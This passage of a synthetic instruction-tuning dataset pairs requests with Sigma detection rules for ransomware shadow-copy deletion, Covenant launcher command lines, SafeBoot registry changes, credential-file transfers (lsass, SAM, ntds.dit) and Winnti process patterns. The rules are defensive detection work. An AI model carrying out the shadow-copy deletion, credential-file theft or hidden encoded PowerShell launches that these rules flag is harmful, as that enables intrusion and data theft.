    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: azure\n    service: auditlogs\ndetection:\n    selection:\n        properties.message:\n            - Add eligible member (permanent)\n            - Add eligible member (eligible)\n    condition: selection\nfalsepositives:\n    - Legtimate administrator actions of adding members from a role\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: azure\n    service: auditlogs\ndetection:\n    selection:\n        properties.message:\n            - Add eligible member (permanent)\n            - Add eligible member (eligible)\n    condition: selection\nfalsepositives:\n    - Legtimate administrator actions of adding members from a role\nlevel: high\n",
      "question": "user is added to a privileged role.",
      "answer": "In order to detect when a user is added to a privileged role, you should: Monitor Azure audit logs for specific activities related to the addition of users to privileged roles. Specifically, look for log entries where the message indicates that an \"Add eligible member (permanent)\" or an \"Add eligible member (eligible)\" action has taken place. These log entries are critical to identify unauthorized or suspicious attempts to elevate privileges within an Azure environment. However, it's important to consider that there might be legitimate administrative actions where users are added to roles as part of normal operations, which could be considered as false positives. The severity level for this kind of activity is considered high due to the potential impact of unauthorized access to privileged roles."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting deletion of Windows Volume Shadow Copies with PowerShell code and Get-WMIObject. This technique is used by numerous ransomware families such as Sodinokibi/REvil.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect deletion of Windows Volume Shadow Copies with PowerShell code and Get-WMIObject, a technique used by numerous ransomware families such as Sodinokibi/REvil, you should: monitor PowerShell scripts on Windows systems for specific command and method invocations. Pay special attention to scripts that contain the commands 'Get-WmiObject', 'gwmi', 'Get-CimInstance', 'gcim' which are used to interact with Windows Management Instrumentation (WMI) objects, and 'Win32_Shadowcopy' indicating interaction with Windows Volume Shadow Copies. Also, be alert for the presence of '.Delete()', 'Remove-WmiObject', 'rwmi', 'Remove-CimInstance', or 'rcim' within the scripts, as these are indicative of attempts to delete objects, including Shadow Copies. Implementing monitoring based on these script contents can help in early detection of ransomware activity that attempts this specific kind of attack.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: ps_script\n    product: windows\ndetection:\n    selection_get:\n        ScriptBlockText|contains:\n            - 'Get-WmiObject'\n            - 'gwmi'\n            - 'Get-CimInstance'\n            - 'gcim'\n    selection_shadowcopy:\n        ScriptBlockText|contains: 'Win32_Shadowcopy'\n    selection_delete:\n        ScriptBlockText|contains:\n            - '.Delete()'\n            - 'Remove-WmiObject'\n            - 'rwmi'\n            - 'Remove-CimInstance'\n            - 'rcim'\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: ps_script\n    product: windows\ndetection:\n    selection_get:\n        ScriptBlockText|contains:\n            - 'Get-WmiObject'\n            - 'gwmi'\n            - 'Get-CimInstance'\n            - 'gcim'\n    selection_shadowcopy:\n        ScriptBlockText|contains: 'Win32_Shadowcopy'\n    selection_delete:\n        ScriptBlockText|contains:\n            - '.Delete()'\n            - 'Remove-WmiObject'\n            - 'rwmi'\n            - 'Remove-CimInstance'\n            - 'rcim'\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "deletion of Windows Volume Shadow Copies with PowerShell code and Get-WMIObject. This technique is used by numerous ransomware families such as Sodinokibi/REvil",
      "answer": "In order to detect deletion of Windows Volume Shadow Copies with PowerShell code and Get-WMIObject, a technique used by numerous ransomware families such as Sodinokibi/REvil, you should: monitor PowerShell scripts on Windows systems for specific command and method invocations. Pay special attention to scripts that contain the commands 'Get-WmiObject', 'gwmi', 'Get-CimInstance', 'gcim' which are used to interact with Windows Management Instrumentation (WMI) objects, and 'Win32_Shadowcopy' indicating interaction with Windows Volume Shadow Copies. Also, be alert for the presence of '.Delete()', 'Remove-WmiObject', 'rwmi', 'Remove-CimInstance', or 'rcim' within the scripts, as these are indicative of attempts to delete objects, including Shadow Copies. Implementing monitoring based on these script contents can help in early detection of ransomware activity that attempts this specific kind of attack."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of \"reg.exe\" commands with the \"add\" or \"copy\" flags on safe boot registry keys. Often used by attacker to allow the ransomware to work in safe mode as some security products do not.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect execution of \"reg.exe\" commands with the \"add\" or \"copy\" flags on safe boot registry keys, often used by attacker to allow the ransomware to work in safe mode as some security products do not, you should: Focus on monitoring process creation events within Windows environments. Specifically, look for instances where the \"reg.exe\" program is executed, indicated either by the program's image name ending with 'reg.exe' or the original file name being 'reg.exe'. Additionally, pay attention to the command line arguments accompanying the execution of \"reg.exe\". It's critical to identify instances where the command line includes references to the system's safe boot configuration, specifically paths containing '\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot'. Moreover, detect command lines that include the use of 'copy' or 'add' commands, which are red flags for potential malicious activity aimed at modifying the registry to ensure malware persistence even in safe mode. Given the unlikely chance of false positives and the high severity of such an action, prompt and thorough investigation is warranted upon detection of these criteria.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: 'reg.exe'\n        - OriginalFileName: 'reg.exe'\n    selection_safeboot:\n        CommandLine|contains: '\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot'\n    selection_flag:\n        CommandLine|contains:\n            - ' copy '\n            - ' add '\n    condition: all of selection*\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: 'reg.exe'\n        - OriginalFileName: 'reg.exe'\n    selection_safeboot:\n        CommandLine|contains: '\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot'\n    selection_flag:\n        CommandLine|contains:\n            - ' copy '\n            - ' add '\n    condition: all of selection*\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "execution of \"reg.exe\" commands with the \"add\" or \"copy\" flags on safe boot registry keys. Often used by attacker to allow the ransomware to work in safe mode as some security products do not",
      "answer": "In order to detect execution of \"reg.exe\" commands with the \"add\" or \"copy\" flags on safe boot registry keys, often used by attacker to allow the ransomware to work in safe mode as some security products do not, you should: Focus on monitoring process creation events within Windows environments. Specifically, look for instances where the \"reg.exe\" program is executed, indicated either by the program's image name ending with 'reg.exe' or the original file name being 'reg.exe'. Additionally, pay attention to the command line arguments accompanying the execution of \"reg.exe\". It's critical to identify instances where the command line includes references to the system's safe boot configuration, specifically paths containing '\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot'. Moreover, detect command lines that include the use of 'copy' or 'add' commands, which are red flags for potential malicious activity aimed at modifying the registry to ensure malware persistence even in safe mode. Given the unlikely chance of false positives and the high severity of such an action, prompt and thorough investigation is warranted upon detection of these criteria."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious command lines used in Covenant luanchers.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious command lines used in Covenant launchers, you should: focus on monitoring the process creation logs within Windows environments. Specifically, look for command lines that display specific indicators of compromise which are commonly associated with these types of attacks. The detection criteria involve finding command lines that contain all of the following: '-Sta', '-Nop', '-Window', and 'Hidden'. Additionally, the presence of either '-Command' or '-EncodedCommand' in the command line also serves as a significant indicator. Alternatively, command lines that contain any of the following strings should also raise suspicion: 'sv o (New-Object IO.MemorySteam);sv d ', 'mshta file.hta', 'GruntHTTP', or '-EncodedCommand cwB2ACAAbwAgA'. The necessity to meet any one of these conditions (either all aspects of the first set or any from the second set) is crucial for triggering an alert. These signatures are distinctly linked with tactics and techniques such as execution, defense evasion, and the use of command and control channels specific to Covenant launcher activities.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_1:\n        CommandLine|contains|all:\n            - '-Sta'\n            - '-Nop'\n            - '-Window'\n            - 'Hidden'\n        CommandLine|contains:\n            - '-Command'\n            - '-EncodedCommand'\n    selection_2:\n        CommandLine|contains:\n            - 'sv o (New-Object IO.MemorySteam);sv d '\n            - 'mshta file.hta'\n            - 'GruntHTTP'\n            - '-EncodedCommand cwB2ACAAbwAgA'\n    condition: 1 of selection_*\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_1:\n        CommandLine|contains|all:\n            - '-Sta'\n            - '-Nop'\n            - '-Window'\n            - 'Hidden'\n        CommandLine|contains:\n            - '-Command'\n            - '-EncodedCommand'\n    selection_2:\n        CommandLine|contains:\n            - 'sv o (New-Object IO.MemorySteam);sv d '\n            - 'mshta file.hta'\n            - 'GruntHTTP'\n            - '-EncodedCommand cwB2ACAAbwAgA'\n    condition: 1 of selection_*\nlevel: high\n",
      "question": "suspicious command lines used in Covenant luanchers",
      "answer": "In order to detect suspicious command lines used in Covenant launchers, you should: focus on monitoring the process creation logs within Windows environments. Specifically, look for command lines that display specific indicators of compromise which are commonly associated with these types of attacks. The detection criteria involve finding command lines that contain all of the following: '-Sta', '-Nop', '-Window', and 'Hidden'. Additionally, the presence of either '-Command' or '-EncodedCommand' in the command line also serves as a significant indicator. Alternatively, command lines that contain any of the following strings should also raise suspicion: 'sv o (New-Object IO.MemorySteam);sv d ', 'mshta file.hta', 'GruntHTTP', or '-EncodedCommand cwB2ACAAbwAgA'. The necessity to meet any one of these conditions (either all aspects of the first set or any from the second set) is crucial for triggering an alert. These signatures are distinctly linked with tactics and techniques such as execution, defense evasion, and the use of command and control channels specific to Covenant launcher activities."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting script file execution (.js, .jse, .vba, .vbe, .vbs, .wsf) by Wscript/Cscript.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect script file execution (.js, .jse, .vba, .vbe, .vbs, .wsf) by Wscript/Cscript, you should monitor for process creation events on Windows systems, specifically focusing on the execution of `wscript.exe` or `cscript.exe`. Detecting the use of these scripting hosts involves looking for their original file names (`wscript.exe` and `cscript.exe`) or paths that end with these executables. Additionally, pay attention to the command line arguments for these processes, as script file executions are indicated by the presence of file extensions such as `.js`, `.jse`, `.vba`, `.vbe`, `.vbs`, and `.wsf`. It's important to note that the effectiveness of this detection might require fine-tuning to reduce potential false positives. One recommended approach is to incorporate the user profile path in the command line analysis if the rule generates too many alerts. This approach will significantly improve the detection's accuracy and utility in identifying actual malicious activity involving script file execution with Wscript or Cscript.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName:\n            - 'wscript.exe'\n            - 'cscript.exe'\n        - Image|endswith:\n            - '\\wscript.exe'\n            - '\\cscript.exe'\n    selection_cli:\n        CommandLine|contains:\n            - '.js'\n            - '.jse'\n            - '.vba'\n            - '.vbe'\n            - '.vbs'\n            - '.wsf'\n    condition: all of selection_*\nfalsepositives:\n    - Some additional tunning is required. It is recommended to add the user profile path in CommandLine if it is getting too noisy.\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName:\n            - 'wscript.exe'\n            - 'cscript.exe'\n        - Image|endswith:\n            - '\\wscript.exe'\n            - '\\cscript.exe'\n    selection_cli:\n        CommandLine|contains:\n            - '.js'\n            - '.jse'\n            - '.vba'\n            - '.vbe'\n            - '.vbs'\n            - '.wsf'\n    condition: all of selection_*\nfalsepositives:\n    - Some additional tunning is required. It is recommended to add the user profile path in CommandLine if it is getting too noisy.\nlevel: medium\n",
      "question": "script file execution (.js, .jse, .vba, .vbe, .vbs, .wsf) by Wscript/Cscript",
      "answer": "In order to detect script file execution (.js, .jse, .vba, .vbe, .vbs, .wsf) by Wscript/Cscript, you should monitor for process creation events on Windows systems, specifically focusing on the execution of `wscript.exe` or `cscript.exe`. Detecting the use of these scripting hosts involves looking for their original file names (`wscript.exe` and `cscript.exe`) or paths that end with these executables. Additionally, pay attention to the command line arguments for these processes, as script file executions are indicated by the presence of file extensions such as `.js`, `.jse`, `.vba`, `.vbe`, `.vbs`, and `.wsf`. It's important to note that the effectiveness of this detection might require fine-tuning to reduce potential false positives. One recommended approach is to incorporate the user profile path in the command line analysis if the rule generates too many alerts. This approach will significantly improve the detection's accuracy and utility in identifying actual malicious activity involving script file execution with Wscript or Cscript."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Transferring files with well-known filenames (sensitive files with credential data) using network shares.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect attempts at transferring files with well-known filenames (sensitive files with credential data) using network shares, you should monitor Windows Security logs for EventID 5145, which corresponds to a network share object was accessed. This EventID is crucial as it indicates file access within shared folders that might be subjected to unauthorized access attempts or data exfiltration activities. Specifically, look for accesses to files containing the following substrings in their paths: '\\mimidrv', '\\lsass', '\\windows\\minidump\\', '\\hiberfil', '\\sqldmpr', '\\sam', '\\ntds.dit', and '\\security'. These paths often include sensitive files that contain credential data and other important information. It's essential to be aware that false positives can occur, especially when sensitive files are being transferred over the network for legitimate administrative purposes by authorized administrators. The severity of this monitoring rule is considered medium, suggesting that while this activity is suspicious, further investigation is needed to confirm malicious intent. Keep in mind, ongoing vigilance and analysis of this type of activity can potentially unveil indicators of techniques tied to Initial Access, Execution, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Discovery, and Lateral Movement - all of which are crucial aspects to understand in the realm of cybersecurity defense.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 5145\n        RelativeTargetName|contains:\n            - '\\mimidrv'\n            - '\\lsass'\n            - '\\windows\\minidump\\'\n            - '\\hiberfil'\n            - '\\sqldmpr'\n            - '\\sam'\n            - '\\ntds.dit'\n            - '\\security'\n    condition: selection\nfalsepositives:\n    - Transferring sensitive files for legitimate administration work by legitimate administrator\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 5145\n        RelativeTargetName|contains:\n            - '\\mimidrv'\n            - '\\lsass'\n            - '\\windows\\minidump\\'\n            - '\\hiberfil'\n            - '\\sqldmpr'\n            - '\\sam'\n            - '\\ntds.dit'\n            - '\\security'\n    condition: selection\nfalsepositives:\n    - Transferring sensitive files for legitimate administration work by legitimate administrator\nlevel: medium\n",
      "question": "Transferring files with well-known filenames (sensitive files with credential data) using network shares",
      "answer": "In order to detect attempts at transferring files with well-known filenames (sensitive files with credential data) using network shares, you should monitor Windows Security logs for EventID 5145, which corresponds to a network share object was accessed. This EventID is crucial as it indicates file access within shared folders that might be subjected to unauthorized access attempts or data exfiltration activities. Specifically, look for accesses to files containing the following substrings in their paths: '\\mimidrv', '\\lsass', '\\windows\\minidump\\', '\\hiberfil', '\\sqldmpr', '\\sam', '\\ntds.dit', and '\\security'. These paths often include sensitive files that contain credential data and other important information. It's essential to be aware that false positives can occur, especially when sensitive files are being transferred over the network for legitimate administrative purposes by authorized administrators. The severity of this monitoring rule is considered medium, suggesting that while this activity is suspicious, further investigation is needed to confirm malicious intent. Keep in mind, ongoing vigilance and analysis of this type of activity can potentially unveil indicators of techniques tied to Initial Access, Execution, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Discovery, and Lateral Movement - all of which are crucial aspects to understand in the realm of cybersecurity defense."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.\nThese services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.\nRemote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect when an adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc., to establish an interactive command and control channel to target systems within networks, you should: Monitor file events on Windows systems for activities involving files located in the directory path containing '\\AppData\\Local\\Temp\\LogMeInInc\\GoToAssist Remote Support Expert\\'. This monitoring strategy is applied as these services, despite their legitimate uses, are often repurposed by adversaries to gain unauthorized access to systems. These types of remote access tools are notably flagged by security research, such as Symantec\u2019s report on \"Living off the Land\", as being used more frequently by adversaries compared to other legitimate software, for malicious intent. It is important to consider that there may be legitimate uses of these software tools within a network, and such instances are considered as false positives. The detection strategy is classified at a medium level of importance in the context of cybersecurity defenses.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: file_event\n    product: windows\ndetection:\n    selection:\n        TargetFilename|contains: '\\AppData\\Local\\Temp\\LogMeInInc\\GoToAssist Remote Support Expert\\'\n    condition: selection\nfalsepositives:\n    - Legitimate use\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: file_event\n    product: windows\ndetection:\n    selection:\n        TargetFilename|contains: '\\AppData\\Local\\Temp\\LogMeInInc\\GoToAssist Remote Support Expert\\'\n    condition: selection\nfalsepositives:\n    - Legitimate use\nlevel: medium\n",
      "question": "An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.\nThese services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.\nRemote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\n",
      "answer": "In order to detect when an adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc., to establish an interactive command and control channel to target systems within networks, you should: Monitor file events on Windows systems for activities involving files located in the directory path containing '\\AppData\\Local\\Temp\\LogMeInInc\\GoToAssist Remote Support Expert\\'. This monitoring strategy is applied as these services, despite their legitimate uses, are often repurposed by adversaries to gain unauthorized access to systems. These types of remote access tools are notably flagged by security research, such as Symantec\u2019s report on \"Living off the Land\", as being used more frequently by adversaries compared to other legitimate software, for malicious intent. It is important to consider that there may be legitimate uses of these software tools within a network, and such instances are considered as false positives. The detection strategy is classified at a medium level of importance in the context of cybersecurity defenses."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting potential DLL sideloading of \"waveedit.dll\", which is part of the Nero WaveEditor audio editing software..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect potential DLL sideloading of \"waveedit.dll\", which is part of the Nero WaveEditor audio editing software, you should: Look for events where the 'waveedit.dll' file is loaded, in the context of Windows operating system image load logging. The detection focuses on identifying situations where 'waveedit.dll' is loaded outside of the legitimate Nero WaveEditor directories. Specifically, if the loaded 'waveedit.dll' does not originate from the legitimate Nero software paths - either 'C:\\Program Files (x86)\\Nero\\Nero Apps\\Nero WaveEditor\\waveedit.exe' or 'C:\\Program Files\\Nero\\Nero Apps\\Nero WaveEditor\\waveedit.exe' and their respective directories - it might indicate an attempt of DLL sideloading. It's highly unlikely that there will be false positives given the specificity of these conditions, meaning if an alert is triggered it suggests a high probability of a malicious activity. Through this method, the focus is on spotting potentially malicious exploitation of trusted processes to execute unauthorized or malicious code, indicative of techniques employed in initial access or persistence.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: image_load\n    product: windows\ndetection:\n    selection:\n        ImageLoaded|endswith: '\\waveedit.dll'\n    filter_main_legit_path:\n        Image:\n            - 'C:\\Program Files (x86)\\Nero\\Nero Apps\\Nero WaveEditor\\waveedit.exe'\n            - 'C:\\Program Files\\Nero\\Nero Apps\\Nero WaveEditor\\waveedit.exe'\n        ImageLoaded|startswith:\n            - 'C:\\Program Files (x86)\\Nero\\Nero Apps\\Nero WaveEditor\\'\n            - 'C:\\Program Files\\Nero\\Nero Apps\\Nero WaveEditor\\'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: image_load\n    product: windows\ndetection:\n    selection:\n        ImageLoaded|endswith: '\\waveedit.dll'\n    filter_main_legit_path:\n        Image:\n            - 'C:\\Program Files (x86)\\Nero\\Nero Apps\\Nero WaveEditor\\waveedit.exe'\n            - 'C:\\Program Files\\Nero\\Nero Apps\\Nero WaveEditor\\waveedit.exe'\n        ImageLoaded|startswith:\n            - 'C:\\Program Files (x86)\\Nero\\Nero Apps\\Nero WaveEditor\\'\n            - 'C:\\Program Files\\Nero\\Nero Apps\\Nero WaveEditor\\'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "potential DLL sideloading of \"waveedit.dll\", which is part of the Nero WaveEditor audio editing software.",
      "answer": "In order to detect potential DLL sideloading of \"waveedit.dll\", which is part of the Nero WaveEditor audio editing software, you should: Look for events where the 'waveedit.dll' file is loaded, in the context of Windows operating system image load logging. The detection focuses on identifying situations where 'waveedit.dll' is loaded outside of the legitimate Nero WaveEditor directories. Specifically, if the loaded 'waveedit.dll' does not originate from the legitimate Nero software paths - either 'C:\\Program Files (x86)\\Nero\\Nero Apps\\Nero WaveEditor\\waveedit.exe' or 'C:\\Program Files\\Nero\\Nero Apps\\Nero WaveEditor\\waveedit.exe' and their respective directories - it might indicate an attempt of DLL sideloading. It's highly unlikely that there will be false positives given the specificity of these conditions, meaning if an alert is triggered it suggests a high probability of a malicious activity. Through this method, the focus is on spotting potentially malicious exploitation of trusted processes to execute unauthorized or malicious code, indicative of techniques employed in initial access or persistence."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting file writes of WMI script event consumer.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect file writes of WMI script event consumer, you should: Monitor Windows file event logs for any activities involving the specific image path 'C:\\WINDOWS\\system32\\wbem\\scrcons.exe'. This image path is associated with the Windows Management Instrumentation (WMI) script event consumer process, which can be indicative of malicious activity when files are written or modified in this directory. It's important to note that there might be false positives, such as legitimate software operations like the Dell Power Manager performing similar activities, specifically if the activity originates from 'C:\\Program Files\\Dell\\PowerManager\\DpmPowerPlanSetup.exe'. This monitoring task is considered to have a high level of importance due to the potential security implications of unauthorized file writes in the WMI script event consumer directory.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: file_event\ndetection:\n    selection:\n        Image: 'C:\\WINDOWS\\system32\\wbem\\scrcons.exe'\n    condition: selection\nfalsepositives:\n    - Dell Power Manager (C:\\Program Files\\Dell\\PowerManager\\DpmPowerPlanSetup.exe)\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: file_event\ndetection:\n    selection:\n        Image: 'C:\\WINDOWS\\system32\\wbem\\scrcons.exe'\n    condition: selection\nfalsepositives:\n    - Dell Power Manager (C:\\Program Files\\Dell\\PowerManager\\DpmPowerPlanSetup.exe)\nlevel: high\n",
      "question": "file writes of WMI script event consumer",
      "answer": "In order to detect file writes of WMI script event consumer, you should: Monitor Windows file event logs for any activities involving the specific image path 'C:\\WINDOWS\\system32\\wbem\\scrcons.exe'. This image path is associated with the Windows Management Instrumentation (WMI) script event consumer process, which can be indicative of malicious activity when files are written or modified in this directory. It's important to note that there might be false positives, such as legitimate software operations like the Dell Power Manager performing similar activities, specifically if the activity originates from 'C:\\Program Files\\Dell\\PowerManager\\DpmPowerPlanSetup.exe'. This monitoring task is considered to have a high level of importance due to the potential security implications of unauthorized file writes in the WMI script event consumer directory."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting specific process characteristics of Winnti malware noticed in Dec/Jan 2020 in a campaign against Honk Kong universities.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect specific process characteristics of Winnti malware noticed in Dec/Jan 2020 in a campaign against Hong Kong universities, you should monitor Windows process creations for specific patterns indicative of this malware activity. Look for processes that are initiated from certain suspicious locations or exhibit unusual behaviors, such as:\n\n1. Processes that are launched from the Windows Temp directory or by 'hpqhvind.exe', and those creating files in 'C:\\ProgramData\\DRM'.\n2. Instances where 'C:\\ProgramData\\DRM' is the starting location of a parent process that launches 'wmplayer.exe'.\n3. Processes that are started by 'Test.exe' and also create an instance of 'wmplayer.exe'.\n4. The specific creation of a process named 'C:\\ProgramData\\DRM\\CLR\\CLR.exe'.\n5. Processes begun by any executables located in 'C:\\ProgramData\\DRM\\Windows' that subsequently start 'SearchFilterHost.exe'.\n\nMonitoring for such process creation events will help in identifying activities associated with the Winnti malware. Generally, there should be minimal false positives for these detection criteria, indicating a high level of confidence in these as indicators of compromise. This approach is critical for ensuring the cybersecurity of systems, particularly in environments that are known targets of this malware, such as universities in Hong Kong.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        ParentImage|contains:\n            - 'C:\\Windows\\Temp'\n            - '\\hpqhvind.exe'\n        Image|startswith: 'C:\\ProgramData\\DRM'\n    selection2:\n        ParentImage|startswith: 'C:\\ProgramData\\DRM'\n        Image|endswith: '\\wmplayer.exe'\n    selection3:\n        ParentImage|endswith: '\\Test.exe'\n        Image|endswith: '\\wmplayer.exe'\n    selection4:\n        Image: 'C:\\ProgramData\\DRM\\CLR\\CLR.exe'\n    selection5:\n        ParentImage|startswith: 'C:\\ProgramData\\DRM\\Windows'\n        Image|endswith: '\\SearchFilterHost.exe'\n    condition: 1 of selection*\nfalsepositives:\n    - Unlikely\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        ParentImage|contains:\n            - 'C:\\Windows\\Temp'\n            - '\\hpqhvind.exe'\n        Image|startswith: 'C:\\ProgramData\\DRM'\n    selection2:\n        ParentImage|startswith: 'C:\\ProgramData\\DRM'\n        Image|endswith: '\\wmplayer.exe'\n    selection3:\n        ParentImage|endswith: '\\Test.exe'\n        Image|endswith: '\\wmplayer.exe'\n    selection4:\n        Image: 'C:\\ProgramData\\DRM\\CLR\\CLR.exe'\n    selection5:\n        ParentImage|startswith: 'C:\\ProgramData\\DRM\\Windows'\n        Image|endswith: '\\SearchFilterHost.exe'\n    condition: 1 of selection*\nfalsepositives:\n    - Unlikely\nlevel: critical\n",
      "question": "specific process characteristics of Winnti malware noticed in Dec/Jan 2020 in a campaign against Honk Kong universities",
      "answer": "In order to detect specific process characteristics of Winnti malware noticed in Dec/Jan 2020 in a campaign against Hong Kong universities, you should monitor Windows process creations for specific patterns indicative of this malware activity. Look for processes that are initiated from certain suspicious locations or exhibit unusual behaviors, such as:\n\n1. Processes that are launched from the Windows Temp directory or by 'hpqhvind.exe', and those creating files in 'C:\\ProgramData\\DRM'.\n2. Instances where 'C:\\ProgramData\\DRM' is the starting location of a parent process that launches 'wmplayer.exe'.\n3. Processes that are started by 'Test.exe' and also create an instance of 'wmplayer.exe'.\n4. The specific creation of a process named 'C:\\ProgramData\\DRM\\CLR\\CLR.exe'.\n5. Processes begun by any executables located in 'C:\\ProgramData\\DRM\\Windows' that subsequently start 'SearchFilterHost.exe'.\n\nMonitoring for such process creation events will help in identifying activities associated with the Winnti malware. Generally, there should be minimal false positives for these detection criteria, indicating a high level of confidence in these as indicators of compromise. This approach is critical for ensuring the cybersecurity of systems, particularly in environments that are known targets of this malware, such as universities in Hong Kong."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Get the processes that are running on the local computer..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to get the processes that are running on the local computer, you should: Monitor script block execution logs on Windows systems, specifically looking for instances where the text `Get-Process` appears within a PowerShell script. This technique requires that Script Block Logging be enabled to track and analyze PowerShell execution. It's important to be aware that there might be legitimate reasons for scripts to query running processes, which could lead to false positives. The risk associated with this specific activity is considered low.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains: Get-Process\n    condition: selection\nfalsepositives:\n    - Legitimate PowerShell scripts\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains: Get-Process\n    condition: selection\nfalsepositives:\n    - Legitimate PowerShell scripts\nlevel: low\n",
      "question": "Get the processes that are running on the local computer.",
      "answer": "In order to get the processes that are running on the local computer, you should: Monitor script block execution logs on Windows systems, specifically looking for instances where the text `Get-Process` appears within a PowerShell script. This technique requires that Script Block Logging be enabled to track and analyze PowerShell execution. It's important to be aware that there might be legitimate reasons for scripts to query running processes, which could lead to false positives. The risk associated with this specific activity is considered low."
    }
  },
  {
